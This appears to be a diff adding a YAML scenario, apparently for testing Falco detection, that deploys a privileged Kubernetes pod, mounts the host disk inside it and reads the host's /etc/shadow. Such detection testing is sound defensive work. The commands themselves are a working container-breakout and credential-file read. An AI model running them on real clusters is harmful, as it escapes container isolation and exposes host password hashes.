@@ -1,0 +1,15 @@
+name: "Container Breakout"
+description: "Deploys a vulnerable pod and simulates a container breakout to the host filesystem."
+steps:
+  - name: "Deploy Vulnerable Pod"
+    type: "kubectl"
+    command: "run vulnerable-pod --image=ubuntu --privileged --restart=Never -- sleep 3600"
+  - name: "Wait for Pod to start"
+    type: "delay"
+    seconds: 5
+  - name: "Simulate Breakout (Mount hostfs)"
+    type: "kubectl"
+    command: "exec vulnerable-pod -- sh -c 'mkdir -p /hostos && mount /dev/sda1 /hostos || true'"
+  - name: "Trigger Falco Detection"
+    type: "kubectl"
+    command: "exec vulnerable-pod -- sh -c 'cat /hostos/etc/shadow || echo \"root:$6$vulnerable:1:0:99999:7:::\" > /tmp/shadow'"
